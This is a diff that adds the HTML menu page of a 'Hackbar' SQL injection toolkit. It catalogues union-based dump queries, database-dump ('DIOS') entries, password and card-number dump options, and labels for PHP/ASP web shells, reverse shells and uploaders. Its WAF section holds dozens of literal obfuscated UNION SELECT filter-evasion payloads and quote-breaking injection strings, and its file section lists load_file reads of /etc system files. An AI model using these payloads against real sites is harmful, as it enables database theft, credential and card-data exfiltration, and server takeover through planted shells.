@@ -1,0 +1,2087 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hackbar</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<nav class="nav">
+  <ul class="">
+    <li><a class="nav-links" id="defaultOpen" onclick="openNav(event, 'Home')">Home</a></li>
+    <div class="nav-left">
+      <li><a class="nav-links" onclick="openNav(event, 'New')">What's new</a></li>
+      <li><a class="nav-links" onclick="openNav(event, 'Tools')">Tools</a></li>
+      <li><a class="nav-links" onclick="openNav(event, 'About')">About</a></li>
+      <li><a class="nav-links" onclick="openNav(event, 'Function')">Function</a></li>
+      <li><a class="nav-links" onclick="openNav(event, 'Custom')">Custom</a></li>
+    </div>
+  </ul>
+</nav>
+  <!-- Home -->
+<div id="Home" class="tabcontent">
+  <h1>WELCOME TO HACKBAR </h1>
+  <h2>Developers</h2>
+</div>
+  <!-- What's new -->
+<div id="New" class="tabcontent">
+  <h1>What's new?</h1>
+  <div class="alert">
+  <span class="closebtn">&times;</span>  
+  <p class="accordion">SQL Basic</p>
+    <div class="panel">
+      <ul class="query">
+        <li class="accordion">Convert Statement</li>
+          <div class="panel">
+            <ul class="query">
+              <li>Convert using UTF-8</li>
+              <li>CAST()</li>
+              <li>unhex(hex(verion()))</li>
+              <li>uncompress(compress(version()))</li>
+              <li>binary(verion())</li>
+              <li>aes_decrypt(aes_encrypt(verion(),1),1)</li>
+              <li>reverse(tacnoc)</li>
+              <li>CONVERT USING ascii</li>
+              <li class="accordion">substring(value,1,1)</li>
+                <div class="panel">
+                  <ul class="query">
+                    <li>substring(concat(value),1,1)=4</li>
+                    <li>substring(concat(value),1,1)=5</li>
+                    <li>substring(concat(value),1,1)=9</li>
+                    <li>substring(concat(value),1,1)=10</li>
+                  </ul>
+                </div>
+              <li>CONVERT(concat(value),binary)</li>
+              <li class="accordion">CHAR()</li>
+                <div class="panel">
+                  <ul class="query">
+                    <li>MySQL CHAR()</li>
+                    <li>MsSQL CHAR()</li>
+                    <li>Oracle CHAR()</li>
+                  </ul>
+                </div>
+              <li class="accordion">Replace White String</li>
+                  <div class="panel">
+                    <ul class="query">
+                      <li>+</li>
+                      <li>/**/</li>
+                      <li>Clear</li>
+                    </ul>
+                  </div>
+              <li class="accordion">System Variable</li>
+              <div class="panel">
+                <ul class="query">
+                  <li class="accordion">MySQL</li>
+                    <div class="panel">
+                      <ul class="query">
+                        <li class="accordion">VERSION</li>
+                          <div class="panel">
+                            <ul class="query">
+                               <li>VERSION()</li>
+                               <li>@@VERSION</li>
+                               <li>@@GLOBAL.VERSION</li>
+                               <li>@@VERSION_COMMENT</li>
+                            </ul>
+                          </div>
+                        <li class="accordion">USER</li>
+                          <div class="panel">
+                            <ul class="query">
+                               <li>USER()</li>
+                               <li>CURRENT_USER()</li>
+                               <li>SYSTEM_USER()</li>
+                               <li>SESSION_USER()</li>
+                               <li>SUBSTRING @</li>
+                               <li>FROM PROCESSLIST</li>
+                            </ul>
+                          </div>
+                        <li class="accordion">DATABASE</li>
+                          <div class="panel">
+                            <ul class="query">
+                               <li>DATABASE()</li>
+                               <li>SCHEMA()</li> 
+                               <li>FROM PROCESSLIST</li> 
+                            </ul>
+                          </div>
+                        <li class="accordion">Get Server Folders</li>
+                          <div class="panel">
+                            <ul class="query">
+                               <li>CHARSETS FOLDER</li>
+                               <li>ERROR LOG LOCATION</li> 
+                               <li>LANGUAGE DATADIR</li> 
+                               <li>PIT FILE</li> 
+                               <li>PLUGIN DIR</li> 
+                               <li>SOCKET DIR</li> 
+                               <li>SQL BASEDIR</li> 
+                               <li>SQL DATADIR</li> 
+                               <li>TEMP DIR</li>
+                            </ul>
+                          </div>
+                        <li class="accordion">CHARSET</li>
+                          <div class="panel">
+                            <ul class="query">
+                               <li>CHARSET CLIENT</li> 
+                               <li>CHARSET CONNECTION</li> 
+                               <li>CHARSET DATABASE</li>
+                               <li>CHARSET FILESYSTEM</li>
+                               <li>CHARSET SERVER</li>
+                            </ul>
+                          </div>
+                         <li>CASE INTENSIV TABLES</li>
+                         <li>CASE INTENSIV SYSTEM</li>
+                         <li>COLLATION SET</li>
+                         <li>HOSTNAME</li>        
+                         <li>INNODB</li>           
+                         <li>OPERATORS</li>
+                         <li>PORT SQL</li> 
+                         <li>RECOVER OPTIONS</li>
+                         <li>SERVER OS</li> 
+                         <li>SERVER OS TYPE</li> 
+                         <li>SSL OPEN</li> 
+                         <li>SYMLINK</li>
+                         <li>TIMEOUT CONNECTION</li> 
+                         <li>TIMEOUT WAIT</li>
+                      </ul>
+                    </div>
+                  </ul>
+              </div>
+              <li class="accordion">Other</li>
+              <div class="panel">
+                <ul class="query">
+                  <li>LPAD()</li>
+                  <li>REPEAT()</li>
+                  <li>IF statement</li>
+                  <li>CASE WHEN THEN</li>
+                </ul>
+              </div>
+            </ul>
+          </div>
+        </ul>
+      </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span> 
+    <p class="accordion">UNION BASED</p>
+    <div class="panel">
+      <ul class="query">
+      <li class="accordion">Coulumn Count</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li>ORDER BY</li>
+            <li>+ORDER+BY+</li>
+            <li>GROUP BY</li>
+            <li>+GROUP+BY+</li>
+            <li>PROCEDURE ANALYSE()</li>
+            <li>(SELECT * FROM *)=(SELECT 1)</li>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Union Statement</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li>Union Select 1,2,3,4,5</li>
+            <li>UNION+SELECT+1,2,3,4,5</li>
+            <li>UNION+All+SELECT+1,2,3,4,5</li>
+            <li>UNION+ALL+SELECT null,null,null</li>
+            <li>UNION(SELECT(1),(2),(3),(4),(5))</li>
+            <li>Union Distinctrow Select 1,2,3,4,5 </li>
+            <li>Union Select 13371,13372,13373 <span class="new">new</span></li>
+            <li>Union Select 1%2c2%2c3%2c4%2c5 <span class="new">new</span></li>
+            <li>Union Select 1–+%0A,2–+%0A,3–+%0A <span class="new">new</span></li>
+            <li>Union Select ~1,~2,~3,~4,~5 <span class="new">new</span></li>
+            <li>Union Select .1,.2,.3,.4,.5 <span class="new">new</span></li>
+            <li >Union Select '1','2','3','4','5' <span class="new">new</span></li>
+            <li class="accordion">Union Select 1111,2222,3333 <span class="new">new</span></li>
+              <div class="panel">
+                <ul class="query">
+                  <!---->
+                  <li>Union Select 1111,2222,3333 <span class="new">new</span></li>
+                  <li>UNION(SELECT(1111),(2222),(3333)<span class="new">new</span></li>
+                  <li>Union Select * from join(SELECT 1111)a...<span class="new">new</span></li>
+                </ul>
+              </div>
+            <li>Union Select CHAR(49),CHAR(50),CHAR(51)<span class="new">new</span></li>
+            <li>join(SELECT 1)a join(SELECT 2)b join(SELECT 3)c <span class="new">new</span></li>
+            <li>%23%0AUnion%23aaaaaaaaaaaaaaaaa%0ASelect%23%0A <span class="new">new</span></li>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Local Dios</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li>LOCAL DIOS 1<span class="new">new</span></li>
+            <li>LOCAL DIOS 2<span class="new">new</span></li>
+            <li>LOCAL DIOS 3<span class="new">new</span></li>
+            <li>LOCAL DIOS 4<span class="new">new</span></li>
+            <li>LOCAL DIOS 5<span class="new">new</span></li>
+            <li>LOCAL DIOS 6<span class="new">new</span></li>
+            <li>LOCAL DIOS 7<span class="new">new</span></li>
+            <li>LOCAL DIOS 8<span class="new">new</span></li>
+            <li>LOCAL DIOS 9<span class="new">new</span></li>
+            <li>LOCAL DIOS 10<span class="new">new</span></li>
+            <li>LOCAL DIOS 11<span class="new">new</span></li>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Local Variable Dios</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li class="accordion">Local Dios</li>
+              <div class="panel">
+                <ul class="query">
+                  <!---->
+                  <li>LOCAL DIOS 1<span class="new">new</span></li>
+                  <li>LOCAL DIOS 2<span class="new">new</span></li>
+                  <li>LOCAL DIOS 3<span class="new">new</span></li>
+                  <li>LOCAL DIOS 4<span class="new">new</span></li>
+                  <li>LOCAL DIOS 5<span class="new">new</span></li>
+                  <li>LOCAL DIOS 6<span class="new">new</span></li>
+                  <li>LOCAL DIOS 7<span class="new">new</span></li>
+                  <li>LOCAL DIOS 8<span class="new">new</span></li>
+                  <li>LOCAL DIOS 9<span class="new">new</span></li>
+                  <li>LOCAL DIOS 10<span class="new">new</span></li>
+                  <li>LOCAL DIOS 11<span class="new">new</span></li>
+                  <li>LOCAL DIOS 12<span class="new">new</span></li>
+                </ul>
+              </div>
+            <li class="accordion">Password Dump</li>
+              <div class="panel">
+                <ul class="query">
+                  <!---->
+                  <li>Data One Shot<span class="new">new</span></li>
+                  <li>Data Second Shot<span class="new">new</span></li>
+                  <li>Data Third Shot<span class="new">new</span></li>
+                </ul>
+              </div>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Basic Statement</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li>USER(),DATABASE(),VERSION()Basic statements</li>
+            <li>Count() DATABASES</li>
+            <li class="accordion">Privileges check</li>
+              <div class="panel">
+                <ul class="query">
+                  <!---->
+                  <li>via I_S.PRIVILEGES</li>
+                  <li>via MySQL SYSTEM TABLE</li>
+                </ul>
+              </div>
+            <li>Get running query</li>  
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Databases</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->     
+            <li>DATABASE_NAMES group_concat()</li>
+            <li>DATABASE_NAMES one shot</li>               
+            <li>DATABASE_NAME From Table Name</li>
+            <li>DATABASE_NAME From Table Name Waf</li>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Tables</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li>TABLE_NAMES </li>
+            <li>TABLE_NAMES one shot</li>              
+            <li>TABLE Name Count</li>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Coulumns</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li>COLUMN_NAMES group_concat() </li>       
+            <li>COLUMN_NAMES one shot </li>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Data</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->           
+            <li>DATA group_concat() </li>     
+            <li>DATA one shot </li>
+            <li>DATA second shot </li>
+            <li>DATA third shot</li> 
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">join method</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li> Join Method by FabiHaXorJoin Method </li> 
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Dios MySQL</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li class="accordion">DIOS SET 1</li>
+              <div class="panel">
+                <ul class="query">
+                  <!---->
+                  <li>DIOS by Bla3l_D3vil</li>
+                  <li>DIOS by AL!3N 6M3 (waf)</li>
+                  <li>DIOS by Alien</li>
+                  <li>DIOS by MCS waf</li>
+                  <li>DIOS by Cobra waf</li>
+                  <li>DIOS by Madblood</li>
+                  <li>DIOS by M@dBl00d</li>
+                  <li>DIOS by Mr.Silent coder</li>
+                  <li>DIOS by T-ProT-Pro</li>
+                  <li>DIOS by Dr.Z3r0</li>
+                  <li>DIOS by Zen</li>
+                  <li>DIOS by MakMan</li>
+                  <li>DIOS by tr0jan WAF</li>
+                  <li>DIOS by Madblood WAF</li>
+                  <li>DIOS by Madblood WAF @x</li>
+                  <li>DIOS by tr0jan Benchmark</li>
+                  <li>DIOS by r0ot@h3x49</li>
+                  <li>DIOS Using Replace</li>
+                  <li>DIOS by MakMan WAF</li>
+                  <li>DIOS by Ajkaro</li>
+                  <li>DIOS by Zen WAF</li>
+                </ul>
+              </div>
+            <li class="accordion">DIOS SET 2</li>
+              <div class="panel">
+                <ul class="query">
+                  <!---->
+                  <li>DIOS by Zen_1</li>
+                  <li>DIOS WAF</li>
+                  <li>DIOS by Rummy</li>
+                  <li>DIOS by Shariq<span class="new">new</span></li>
+                  <li>DIOS by H3LL4R_H5H</li>
+                  <li>DIOS by Harsha Haxor</li>
+                  <li>DIOS by Dhani</li>
+                  <li>DIOS by Rahul R@Z</li>
+                  <li>DIOS by DHANI (WAF)</li>
+                  <li>DIOS by Sec7or Team</li>
+                  <li>DUMP Lokomedia</li>
+                  <li>DIOS by R3yz3</li>        
+                  <li>DIOS by Profexer</li>
+                  <li>DIOS 403 - T&amp;C<span class="new">new</span></li>
+                  <li>DIOS 403 - U&amp;P<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 1<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 2<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 3<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 4<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 5<span class="new">new</span></li>
+                </ul>
+              </div>
+            <li class="accordion">DIOS SET 3</li>
+              <div class="panel">
+                <ul class="query">
+                  <!---->
+                  <li>DIOS by SKIDROW 6<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 7<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 8<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 9<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 10<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 11<span class="new">new</span></li>
+                  <li>DIOS by SKIDROW 12<span class="new">new</span></li>
+                  <li>DIOS by Ahmed with xss <span class="new">new</span></li>
+                  <li>DIOS by Ahmed SQL + Xss <span class="new">new</span></li>
+                  <li>Dios by Ahmed without Hex <span class="new">new</span></li>
+                  <li>Eror Base Dios After Parmet <span class="new">new</span></li>
+                  <li>Expo Method On Vul. Col<span class="new">new</span></li>
+                  <li>Logical variable Dios <span class="new">new</span></li>
+                  <li>DIOS By An0n 3xPloiTeRAn0n<span class="new">new</span></li>
+                  <li>DIOS By Exorcism 1<span class="new">new</span></li>
+                  <li>DIOS By Exorcism 2<span class="new">new</span></li>
+                  <li>DIOS Using DUMP_CARD NUMBER<span class="new">new</span></li>
+                  <li>DIOS Using MID SEPARATOR<span class="new">new</span></li>
+                  <li>DIOS Using Reverse<span class="new">new</span></li>
+                  <li>DIOS Using Benchmark<span class="new">new</span></li>
+                </ul>
+              </div>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Dios PostgreSQL</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li>FOR POSTGRE 8.4 Postgre</li>
+            <li>FOR POSTGRE 9.1Postgre</li>
+            <li>ALL VERSIONPostgre</li>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Dios MsSQL</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+             <li>DIOS by Rummy / Zen MSSQL</li>
+          </ul>
+        </div>
+      <!---->
+      <li class="accordion">Varible Methods</li>
+        <div class="panel">
+          <ul class="query">
+            <!---->
+            <li>DB Names </li>
+            <li>DB Count </li>
+            <li>Primary DB Tables Count </li>
+            <li>Primary DB Columns Count </li>
+            <li>InfoSchema Tables Count </li>
+            <li>InfoSchema Columns Count </li>
+          </ul>
+        </div>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">OUT FILE</p>
+    <div class="panel">
+      <ul class="query">
+        <li>File Privileges</li>
+        <li>Find Root Permission</li>
+        <li>Find Server Dir  ( id[]=1 )</li>
+        <li class="accordion">Load File</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>load_file('/etc/my.cnf')</li>
+              <li>load_file('/etc/group')</li>
+              <li>load_file('/etc/services')</li>
+              <li>load_file('/etc/hosts')</li>
+              <li>load_file('/etc/httpd/conf/httpd.conf')</li>
+            </ul>
+          </div>
+        <!---->
+        <li>INTO OUTFILE</li>
+        <li>VIEW SOURCE</li>
+        <li class="accordion">Mics. Script<span class="new">new</span></li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>Block Shell Backdoor <span class="new">new</span></li>
+            </ul>
+          </div>
+        <li class="accordion">PHP Shells</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>WSO shell</li>
+              <li>c99 Shell</li>
+              <li>b374k mini shell</li>
+              <li>mini shell</li>
+              <li>ssi shell</li>
+              <li>An0n 3xPloiTeR Shell</li>
+              <li>An0n 3xPloiTeR Mini</li>
+              <li class="accordion">Wget System<span class="new">new</span></li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>WGET system (WSO Shells)<span class="new">new</span></li>
+                    <li>WGET exec (WSO Shells)<span class="new">new</span></li>
+                    <li>WGET shell_exec (WSO Shells)<span class="new">new</span></li>
+                    <li>WGET passthru (WSO Shells)<span class="new">new</span></li>
+                  </ul>
+                </div>
+              <li class="accordion">PHP SHELL by ALIEN<span class="new">new</span></li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li class="accordion">PHP SHELL</li>
+                      <div class="panel">
+                        <ul class="query">
+                          <!---->
+                          <li>WSO SHELL TXT<span class="new">new</span></li>
+                          <li>INDOXPLOIT SHELL TXT<span class="new">new</span></li>
+                          <li>ALFA 3.0 SHELL TXT<span class="new">new</span></li>
+                          <li>R57 SHELL TXT<span class="new">new</span></li>
+                          <li>R57 SHELL TXT<span class="new">new</span></li>
+                        </ul>
+                      </div>
+                    <li class="accordion">ASP SHELL</li>
+                      <div class="panel">
+                        <ul class="query">
+                          <!---->
+                          <li>ASP WEB SHELL TXT<span class="new">new</span></li>
+                          <li>EL-YOFRO SHELL TXT<span class="new">new</span></li>
+                          <li>KACAK SHELL TXT<span class="new">new</span></li>
+                          <li>ASP CMD SHELL TXT<span class="new">new</span></li>
+                          <li>POUYA SHELL TXT<span class="new">new</span></li>
+                        </ul>
+                      </div>
+                    <li class="accordion">SHTML SHELL</li>
+                      <div class="panel">
+                        <ul class="query">
+                          <!---->
+                          <li>SHTML SHELL TXT<span class="new">new</span></li>
+                        </ul>
+                      </div>
+                  </ul>
+                </div>
+            </ul>
+          </div>
+        <li class="accordion">PHP Script</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>PHP Reverse Shell (Bash)</li>
+              <li>PHP RFI</li>
+              <li>Node.js Reverse Shell</li>
+              <li>Uploader Script (0xHex)</li>
+              <li>Tiny Shell (0xHex By Rahul Raz)</li>
+              <li>Uploader (LFI)</li>
+              <li>404 Uploader (LFI by Ph.Hitachi)<span class="new">new</span></li>
+              <li>@fwrite/fopen with phpinfo()<span class="new">new</span></li>
+              <li>fwrite/fopen (WSO shell)<span class="new">new</span></li>
+              <li>fwrite/fopen txt </li>
+              <li>${@fwrite/fopen}<span class="new">new</span></li>
+              <li>CMD script (0xHex)</li>
+              <li>CMD php script (GET)<span class="new">new</span></li>
+              <li>CMD php script (POST)<span class="new">new</span></li>
+              <li>CMD base64 (GET)<span class="new">new</span></li>
+              <li>CMD eval (REQUEST)<span class="new">new</span></li>
+              <li>PHPINFO()</li>
+            </ul>
+          </div>
+        <li class="accordion">Writable Path</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li class="accordion">Linux</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>/var/www/...</li>
+                    <li>/var/www/...</li>
+                    <li>/var/www/...</li>
+                    <li>/var/www/...</li>
+                    <li>/var/www/...</li>
+                    <li>/etc/init.d/...</li>
+                    <li>/etc/httpd/...</li>
+                    <li>/etc/apache/...</li>
+                    <li>/etc/apache/...</li>
+                    <li>/etc/apache2/...</li>
+                    <li>/etc/apache2/...</li>
+                    <li>/usr/local/...</li>
+                    <li>/usr/local/...</li>
+                    <li>/opt/apache/...</li>
+                    <li>/home/apache/...</li>
+                    <li>/home/apache/...</li>
+                    <li>/etc/apache2/...</li>
+                    <li>/etc/apache2/...</li>
+                    <li>/templates_compiled/</li>
+                    <li>/templates_c/</li>
+                    <li>/temporary/</li>
+                    <li>/images/</li>
+                    <li>/files/</li>
+                    <li>/temp/</li>
+                    <li>/etc/httpd/conf/httpd.conf</li>
+                  </ul>
+                </div>
+              <li class="accordion">Windows</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>C:/XAMPP/...</li>
+                    <li>C:/AppServ/...</li>
+                    <li>C:/XAMPP/...</li>
+                    <li>C:/AppServ/...</li>
+                    <li>C:/wamp/...</li>
+                    <li>C:/wamp/...</li>
+                    <li>C:/Program Files/Ampps/...</li>
+                    <li>C:/Program Files (x86)/Ampps/...</li>
+                  </ul>
+                </div>
+            </ul>
+          </div>
+      </ul>
+    </div>
+    </div>
+  <div class="alert">
+  <span class="closebtn">&times;</span>
+  <p class="accordion">WAF BASED</p>
+    <div class="panel">
+      <ul class="query">
+        <!---->
+        <li class="accordion">Order by</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>/**/ORDER/**/BY/**/</li>
+              <li>/*!order*/+/*!by*/</li>
+              <li>/*!ORDER BY*/ </li>
+              <li>/*!50000ORDER*//**//*!50000BY*/ </li>
+              <li>/*!12345ORDER*/+/*!BY*/ </li>
+              <li>/*!50000ORDER BY*/ </li>
+              <li>/**/**/ORDER/**/BY/**/**/ </li>
+              <li>order/**_**/by </li>
+            </ul>
+          </div>
+        <li class="accordion">Union Select</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li class="accordion">UNION TAB 1</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>/*!50000%55nIoN*/ /*!50000%53eLeCt*/</li>
+                    <li>%55nion(%53elect 1,2,3)</li>
+                    <li>+union+distinct+select+</li>
+                    <li>+union+distinctROW+select+</li>
+                    <li>+ #?uNiOn + #?sEleCt</li>
+                    <li>+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt</li>
+                    <li>/*!%55NiOn*/ /*!%53eLEct*/</li>
+                    <li>+un/**/ion+se/**/lect</li>
+                    <li>UNION/*&test=1*/SELECT/*&pwn=2*/</li>
+                    <li>+?UnI?On?+'SeL?ECT?</li>
+                    <li>+(UnIoN)+(SelECT)+</li>
+                    <li>+(UnI)(oN)+(SeL)(EcT)</li>
+                    <li>+UnIoN/*&a=*/SeLeCT/*&a=*/</li>
+                    <li>+uni>on+sel>ect+</li>
+                    <li>%55nion(%53elect 1,2,3)-- -</li>
+                    <li>/**//*!12345UNION SELECT*//**/</li>
+                    <li>/**//*!50000UNION SELECT*//**/</li>
+                    <li>/**/UNION/**//*!50000SELECT*//**/</li>
+                    <li>/*!50000UniON SeLeCt*/</li>
+                    <li>union /*!50000%53elect*/</li>
+                  </ul>
+                </div>
+              <li class="accordion">UNION TAB 2</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>+ #?uNiOn + #?sEleCt</li>
+                    <li>+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt</li>
+                    <li>/*!%55NiOn*/ /*!%53eLEct*/</li>
+                    <li>/*!u%6eion*/ /*!se%6cect*/</li>
+                    <li>+un/**/ion+se/**/lect</li>
+                    <li>uni%0bon+se%0blect</li>
+                    <li>%2f**%2funion%2f**%2fselect</li>
+                    <li>union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</li>
+                    <li>REVERSE(noinu)+REVERSE(tceles)</li>
+                    <li>/*--*/union/*--*/select/*--*/</li>
+                    <li>union (/*!/**/ SeleCT */ 1,2,3)</li>
+                    <li>/*!union*/+/*!select*/</li>
+                    <li>union+/*!select*/</li>
+                    <li>/**/union/**/select/**/</li>
+                    <li>/**/uNIon/**/sEleCt/**/</li>
+                    <li>+%2F**/+Union/*!select*/</li>
+                    <li>/**//*!union*//**//*!select*//**/</li>
+                    <li>/*!uNIOn*/ /*!SelECt*/</li>
+                    <li>uNiOn aLl sElEcT</li>
+                    <li>UNIunionON+SELselectECT</li>
+                  </ul>
+                </div>
+              <li class="accordion">UNION TAB 3</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>/**/union/*!50000select*//**/</li>
+                    <li>0%a0union%a0select%09</li>
+                    <li>%0Aunion%0Aselect%0A</li>
+                    <li>%55nion/**/%53elect</li>
+                    <li>uni/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/</li>
+                    <li>%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/</li>
+                    <li>%0A%09UNION%0CSELECT%10NULL%</li>
+                    <li>/*!union*//*--*//*!all*//*--*//*!select*/</li>
+                    <li>union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</li>
+                    <li>/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/</li>
+                    <li>+UnIoN/*&a=*/SeLeCT/*&a=*/</li>
+                    <li>union+sel%0bect</li>
+                    <li>+uni*on+sel*ect+</li>
+                    <li>+#1q%0Aunion all#qa%0A#%0Aselect</li>
+                    <li>union(select (1),(2),(3),(4),(5))<span class="new">new</span></li>
+                    <li>UNION(SELECT(column)FROM(table))<span class="new">new</span></li>
+                    <li>%23xyz%0AUnIOn%23xyz%0ASeLecT+<span class="new">new</span></li>
+                    <li>%23xyz%0A%55nIOn%23xyz%0A%53eLecT+<span class="new">new</span></li>
+                    <li>union(select(1),2,3)</li>
+                    <li>union (select 1111,2222,3333)<span class="new">new</span></li>
+                  </ul>
+                </div>
+              <li class="accordion">UNION TAB 4</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>uNioN (/*!/**/ SeleCT */ 11)</li>
+                    <li>union (select 1111,2222,3333)</li>
+                    <li>+#1q%0AuNiOn all#qa%0A#%0AsEleCt</li>
+                    <li>/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/</li>
+                    <li>%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/</li>
+                    <li>+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+</li>
+                    <li>+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</li>
+                    <li>/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/</li>
+                    <li>+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+</li>
+                    <li>/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/</li>
+                    <li>/union\sselect/g</li>
+                    <li>/union\s+select/i</li>
+                    <li>/*!UnIoN*/SeLeCT</li>
+                    <li>+UnIoN/*&a=*/SeLeCT/*&a=*/</li>
+                    <li>+uni>on+sel>ect+</li>
+                    <li>+(UnIoN)+(SelECT)+</li>
+                    <li>+(UnI)(oN)+(SeL)(EcT)</li>
+                    <li>+?UnI?On?+'SeL?ECT?</li>
+                    <li>+uni on+sel ect+</li>
+                    <li>+/*!UnIoN*/+/*!SeLeCt*/+</li>
+                  </ul>
+                </div>
+              <li class="accordion">UNION TAB 5</li>
+                <div class="panel">
+                  <ul class="query">
+                    <!---->
+                    <li>/*!u%6eion*/ /*!se%6cect*/</li>
+                    <li>uni%20union%20/*!select*/%20</li>
+                    <li>union%23aa%0Aselect</li>
+                    <li>/**/union/*!50000select*/</li>
+                    <li>/^****union.*$/ /^****select.*$/</li>
+                    <li>/*union*/union/*select*/select+</li>
+                    <li>/*uni X on*/union/*sel X ect*/</li>
+                    <li>+un/**/ion+sel/**/ect+</li>
+                    <li>+UnIOn%0d%0aSeleCt%0d%0a</li>
+                    <li>UNION/*&test=1*/SELECT/*&pwn=2*/</li>
+                    <li>un?+un/**/ion+se/**/lect+</li>
+                    <li>+UNunionION+SEselectLECT+</li>
+                    <li>+uni%0bon+se%0blect+</li>
+                    <li>%252f%252a*/union%252f%252a /select%252f%252a*/</li>
+                    <li>/%2A%2A/union/%2A%2A/select/%2A%2A/</li>
+                    <li>%2f**%2funion%2f**%2fselect%2f**%2f</li>
+                    <li>union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</li>
+                    <li>/*!UnIoN*/SeLecT+</li>
+                    <li>/*!50000UnION*//*!50000SeLeCt*/</li>
+                    <li>')AnD null UNiON SeLeCt 1,2,3,4,5;%00<span class="new">new</span></li>
+                    <li>')AnD null UNiON SeLeCt 1,2,3,4,5+--+<span class="new">new</span></li>
+                    <li>' And True Union Select 1,2,3;%00<span class="new">new</span></li>
+                    <li>' And False Union Select 1,2,3;%00<span class="new">new</span></li>
+                    <li>' And True Union Select 1,2,3+--+<span class="new">new</span></li>
+                    <li>' And False Union Select 1,2,3+--+</li>
+                  </ul>
+                </div>
+            </ul>
+          </div>
+        <li class="accordion">Concat</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>CoNcAt()</li>
+              <li>CON%08CAT()</li>
+              <li>%0AcOnCat()</li>
+              <li>/**//*!12345cOnCat*/</li>
+              <li>/*!50000cOnCat*/(/*!*/)</li>
+              <li>unhex(hex(concat(table_name)))</li>
+              <li>unhex(hex(/*!12345concat*/(table_name)))</li>
+              <li>unhex(hex(/*!50000concat*/(table_name)))</li>
+            </ul>
+          </div>
+        <li class="accordion">Group Concat</li>
+          <div class="panel">
+            <ul class="query">
+              <!---->
+              <li>/*!group_concat*/()</li>
+              <li>gRoUp_cOnCAt()</li>
+              <li>group_concat(/*!*/)</li>
+              <li>group_concat(/*!12345table_name*/)</li>
+              <li>group_concat(/*!50000table_name*/)</li>
+              <li>/*!group_concat*/(/*!12345table_name*/)</li>
+              <li>/*!group_concat*/(/*!50000table_name*/)</li>
+              <li>/*!12345group_concat*/(/*!12345table_name*/)</li>
+              <li>/*!50000group_concat*/(/*!50000table_name*/)</li>
+              <li>/*!GrOuP_ConCaT*/()</li>
+              <li>/*!12345GroUP_ConCat*/()</li>
